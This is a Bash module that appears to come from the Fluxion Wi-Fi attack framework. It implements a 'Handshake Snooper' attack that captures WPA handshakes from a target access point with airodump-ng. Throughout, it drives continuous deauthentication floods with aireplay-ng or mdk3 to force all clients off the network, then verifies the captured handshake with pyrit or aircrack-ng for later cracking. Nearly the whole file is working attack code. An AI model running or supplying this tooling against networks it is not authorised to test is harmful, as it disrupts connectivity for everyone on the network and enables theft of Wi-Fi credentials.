#!/bin/bash

########################### < Handshake Snooper Parameters > ###########################

HandshakeSnooperState="Not Ready"

################################# < Handshake Snooper > ################################
function handshake_snooper_arbiter_daemon() {
	if [ ${#@} -lt 1 -o "$HandshakeSnooperState" != "Running" ]; then return 1; fi

	# Start daemon in the running state to continue execution until aborted,
	# or until a hash has been verified to exist in the capture file.
	# NOTE: The line below must remain before trap to prevent race conditions.
	local handshake_snooper_arbiter_daemon_state="running"

	function handshake_snooper_arbiter_daemon_abort() {
		handshake_snooper_arbiter_daemon_state="aborted"
		if [ "$handshake_snooper_arbiter_daemon_viewerPID" ]; then
			kill $handshake_snooper_arbiter_daemon_viewerPID
		fi

		handshake_snooper_stop_deauthenticator
		handshake_snooper_stop_captor
	}

	trap handshake_snooper_arbiter_daemon_abort SIGABRT

	source lib/HashUtils.sh
	source lib/ColorUtils.sh

	echo -e "[$(env -i date '+%H:%M:%S')] $HandshakeSnooperStartingArbiterNotice" > $FLUXIONWorkspacePath/handshake_snooper.log

	# Display some feedback to the user to assure verifier is working.
	xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg "#000000" -fg "#CCCCCC" -title "Handshake Snooper Arbiter Log" -e "tail -f $FLUXIONWorkspacePath/handshake_snooper.log" &
	local handshake_snooper_arbiter_daemon_viewerPID=$!

	handshake_snooper_start_captor
	handshake_snooper_start_deauthenticator

	local handshake_snooper_arbiter_daemon_verified=1 # Assume it hasn't been verified yet (1 => false/error).

	# Keep snooping and verifying until we've got a valid hash from the capture file.
	while [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; do
		echo -e "[$(env -i date '+%H:%M:%S')] `io_dynamic_output $HandshakeSnooperSnoopingForNSecondsNotice`" >> $FLUXIONWorkspacePath/handshake_snooper.log
		sleep $HANDSHAKEVerifierInterval;

		# Check for abort after every blocking operation.
		if [ "$handshake_snooper_arbiter_daemon_state" = "aborted" ]; then break; fi

		# If synchronously searching, stop the captor and deauthenticator before checking.
		if [ "$HANDSHAKEVerifierSynchronicity" = "blocking" ]; then
			echo -e "[$(env -i date '+%H:%M:%S')] $HandshakeSnooperStoppingForVerifierNotice" >> $FLUXIONWorkspacePath/handshake_snooper.log
			handshake_snooper_stop_deauthenticator
			handshake_snooper_stop_captor
			mv "$FLUXIONWorkspacePath/capture/dump-01.cap" "$FLUXIONWorkspacePath/capture/recent.cap"
		else
			pyrit -r "$FLUXIONWorkspacePath/capture/dump-01.cap" -o "$FLUXIONWorkspacePath/capture/recent.cap" stripLive &> $FLUXIONOutputDevice
		fi

		# Check for abort after every blocking operation.
		if [ "$handshake_snooper_arbiter_daemon_state" = "aborted" ]; then break; fi

		echo -e "[$(env -i date '+%H:%M:%S')] $HandshakeSnooperSearchingForHashesNotice" >> $FLUXIONWorkspacePath/handshake_snooper.log
		hash_check_handshake "$HANDSHAKEVerifierIdentifier" "$FLUXIONWorkspacePath/capture/recent.cap" "$APTargetSSID" "$APTargetMAC"
		handshake_snooper_arbiter_daemon_verified=$?

		# Check for abort after every blocking operation.
		if [ "$handshake_snooper_arbiter_daemon_state" = "aborted" ]; then break; fi

		# If synchronously searching, restart the captor and deauthenticator after checking.
		if [ "$HANDSHAKEVerifierSynchronicity" = "blocking" -a $handshake_snooper_arbiter_daemon_verified -ne 0 ]; then
			sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/*"

			handshake_snooper_start_captor
			handshake_snooper_start_deauthenticator

			# Check for abort after every blocking operation.
			if [ "$handshake_snooper_arbiter_daemon_state" = "aborted" ]; then break; fi
		fi
	done

	# Stop captor and deauthenticator if we were searching asynchronously.
	if [ "$HANDSHAKEVerifierSynchronicity" = "non-blocking" ]; then
		handshake_snooper_stop_deauthenticator
		handshake_snooper_stop_captor
	fi

	# If handshake didn't pass verification, it was aborted.
	if [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; then
		echo -e "[$(env -i date '+%H:%M:%S')] $HandshakeSnooperArbiterAbortedWarning" >> $FLUXIONWorkspacePath/handshake_snooper.log
		return 1
	else
		echo -e "[$(env -i date '+%H:%M:%S')] $HandshakeSnooperArbiterSuccededNotice" >> $FLUXIONWorkspacePath/handshake_snooper.log
	fi

    echo -e "[$(env -i date '+%H:%M:%S')] $HandshakeSnooperArbiterCompletedTip" >> $FLUXIONWorkspacePath/handshake_snooper.log

	# Assure we've got a directory to store hashes into.
	local handshake_snooper_arbiter_daemon_hashDirectory="$FLUXIONPath/attacks/Handshake Snooper/handshakes/"
	if [ ! -d "$handshake_snooper_arbiter_daemon_hashDirectory" ]; then
		mkdir -p "$handshake_snooper_arbiter_daemon_hashDirectory"
	fi

	# Move handshake to storage if one was acquired.
	mv "$FLUXIONWorkspacePath/capture/recent.cap" "$FLUXIONPath/attacks/Handshake Snooper/handshakes/$APTargetSSIDClean-$APTargetMAC.cap"

	# Cleanup files we've created to leave it in original state.
	sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/dump-*"

	# Signal parent process the verification terminated.
	kill -s SIGABRT $1
}

function handshake_snooper_stop_captor() {
	if [ "$HANDSHAKECaptorPID" ]; then
		kill -s SIGINT $HANDSHAKECaptorPID &> $FLUXIONOutputDevice
	fi

	HANDSHAKECaptorPID=""
}

function handshake_snooper_start_captor() {
	if [ "$HANDSHAKECaptorPID" ]; then return 0; fi
	if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi

	handshake_snooper_stop_captor

	xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $APTargetChannel)" $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
	    airodump-ng --ignore-negative-one -d $APTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $APTargetChannel -a $WIMonitor &
    local parentPID=$!

    while [ ! "$HANDSHAKECaptorPID" ]
        do sleep 1; HANDSHAKECaptorPID=$(pgrep -P $parentPID)
    done
}

function handshake_snooper_stop_deauthenticator() {
	if [ "$HANDSHAKEDeauthenticatorPID" ]; then
		kill $HANDSHAKEDeauthenticatorPID &> $FLUXIONOutputDevice
	fi

	HANDSHAKEDeauthenticatorPID=""
}

function handshake_snooper_start_deauthenticator() {
	if [ "$HANDSHAKEDeauthenticatorPID" ]; then return 0; fi
	if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi

	handshake_snooper_stop_deauthenticator

	# Prepare deauthenticators
	case "$HANDSHAKEDeauthenticatorIdentifier" in
		"$HandshakeSnooperMdk3MethodOption") echo "$APTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst
	esac

	# Start deauthenticators.
	case "$HANDSHAKEDeauthenticatorIdentifier" in
		"$HandshakeSnooperAireplayMethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
				"while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $APTargetMAC --ignore-negative-one $WIMonitor; done" &
			HANDSHAKEDeauthenticatorPID=$!;;
		"$HandshakeSnooperMdk3MethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
				 "while true; do sleep 7; timeout 3 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $APTargetChannel; done"  &
			HANDSHAKEDeauthenticatorPID=$!;;
	esac
}

function handshake_snooper_unset_deauthenticator_identifier() {
	HANDSHAKEDeauthenticatorIdentifier=""
}

function handshake_snooper_set_deauthenticator_identifier() {
	if [ "$HANDSHAKEDeauthenticatorIdentifier" ]; then return 0; fi

	handshake_snooper_unset_deauthenticator_identifier

	local methods=("$HandshakeSnooperMonitorMethodOption" "$HandshakeSnooperAireplayMethodOption" "$HandshakeSnooperMdk3MethodOption" "$FLUXIONGeneralBackOption")
	io_query_choice "$HandshakeSnooperMethodQuery" methods[@]

	HANDSHAKEDeauthenticatorIdentifier=$IOQueryChoice

	echo

	if [ "$HANDSHAKEDeauthenticatorIdentifier" = "$FLUXIONGeneralBackOption" ]; then
		handshake_snooper_unset_deauthenticator_identifier
		return 1
	fi
}

function handshake_snooper_unset_verifier_identifier() {
	HANDSHAKEVerifierIdentifier=""
}

function handshake_snooper_set_verifier_identifier() {
	if [ "$HANDSHAKEVerifierIdentifier" ]; then return 0; fi

	handshake_snooper_unset_verifier_identifier

	local choices=("$FLUXIONHashVerificationMethodPyritOption" "$FLUXIONHashVerificationMethodAircrackOption" "$FLUXIONGeneralBackOption")
	io_query_choice "$FLUXIONHashVerificationMethodQuery" choices[@]

	echo

	case "$IOQueryChoice" in
		"$FLUXIONHashVerificationMethodPyritOption") HANDSHAKEVerifierIdentifier="pyrit";;
		"$FLUXIONHashVerificationMethodAircrackOption") HANDSHAKEVerifierIdentifier="aircrack-ng";;
		"$FLUXIONGeneralBackOption")
			handshake_snooper_unset_verifier_identifier
			return 1;;
	esac
}

function handshake_snooper_unset_verifier_interval() {
	HANDSHAKEVerifierInterval=""
}

function handshake_snooper_set_verifier_interval() {
	if [ "$HANDSHAKEVerifierInterval" ]; then return 0; fi

	handshake_snooper_unset_verifier_interval

	local choices=("$HandshakeSnooperVerifierInterval30SOption" "$HandshakeSnooperVerifierInterval60SOption" "$HandshakeSnooperVerifierInterval90SOption" "$FLUXIONGeneralBackOption")
	io_query_choice "$HandshakeSnooperVerifierIntervalQuery" choices[@]

	case "$IOQueryChoice" in
		"$HandshakeSnooperVerifierInterval30SOption") HANDSHAKEVerifierInterval=30;;
		"$HandshakeSnooperVerifierInterval60SOption") HANDSHAKEVerifierInterval=60;;
		"$HandshakeSnooperVerifierInterval90SOption") HANDSHAKEVerifierInterval=90;;
		"$FLUXIONGeneralBackOption")
			handshake_snooper_unset_verifier_interval
			return 1;;
	esac
}

function handshake_snooper_unset_verifier_synchronicity() {
	HANDSHAKEVerifierSynchronicity=""
}

function handshake_snooper_set_verifier_synchronicity() {
	if [ "$HANDSHAKEVerifierSynchronicity" ]; then return 0; fi

	handshake_snooper_unset_verifier_synchronicity

	local choices=("$HandshakeSnooperVerifierSynchronicityAsynchronousOption" "$HandshakeSnooperVerifierSynchronicitySynchronousOption" "$FLUXIONGeneralBackOption")
	io_query_choice "$HandshakeSnooperVerifierSynchronicityQuery" choices[@]

	case "$IOQueryChoice" in
		"$HandshakeSnooperVerifierSynchronicityAsynchronousOption") HANDSHAKEVerifierSynchronicity="non-blocking";;
		"$HandshakeSnooperVerifierSynchronicitySynchronousOption") HANDSHAKEVerifierSynchronicity="blocking";;
		"$FLUXIONGeneralBackOption")
			handshake_snooper_unset_verifier_synchronicity
			return 1;;
	esac
}

function unprep_attack() {
	HandshakeSnooperState="Not Ready"

	handshake_snooper_unset_verifier_synchronicity
	handshake_snooper_unset_verifier_interval
	handshake_snooper_unset_verifier_identifier
	handshake_snooper_unset_deauthenticator_identifier

	sandbox_remove_workfile "$FLUXIONWorkspacePath/capture"
}

function prep_attack() {
	mkdir -p "$FLUXIONWorkspacePath/capture"

	while true; do
		handshake_snooper_set_deauthenticator_identifier; if [ $? -ne 0 ]; then break; fi
		handshake_snooper_set_verifier_identifier; if [ $? -ne 0 ]; then
			handshake_snooper_unset_deauthenticator_identifier; continue
		fi
		handshake_snooper_set_verifier_interval; if [ $? -ne 0 ]; then
			handshake_snooper_unset_verifier_identifier; continue
		fi
		handshake_snooper_set_verifier_synchronicity; if [ $? -ne 0 ]; then
			handshake_snooper_unset_verifier_interval; continue;
		fi
		HandshakeSnooperState="Ready"
		break
	done

	# Check for handshake abortion.
	if [ "$HandshakeSnooperState" != "Ready" ]; then
		unprep_attack
		return 1;
	fi
}

function stop_attack() {
	if [ "$HANDSHAKEArbiterPID" ]; then
		kill -s SIGABRT $HANDSHAKEArbiterPID &> $FLUXIONOutputDevice
	fi

	HANDSHAKEArbiterPID=""

	HandshakeSnooperState="Stopped"
}

function start_attack() {
    if [ "$HandshakeSnooperState" = "Running" ]; then return 0; fi
    if [ "$HandshakeSnooperState" != "Ready" ]; then return 1; fi
    HandshakeSnooperState="Running"

	handshake_snooper_arbiter_daemon $$ &> $FLUXIONOutputDevice &
	HANDSHAKEArbiterPID=$!
}

# FLUXSCRIPT END
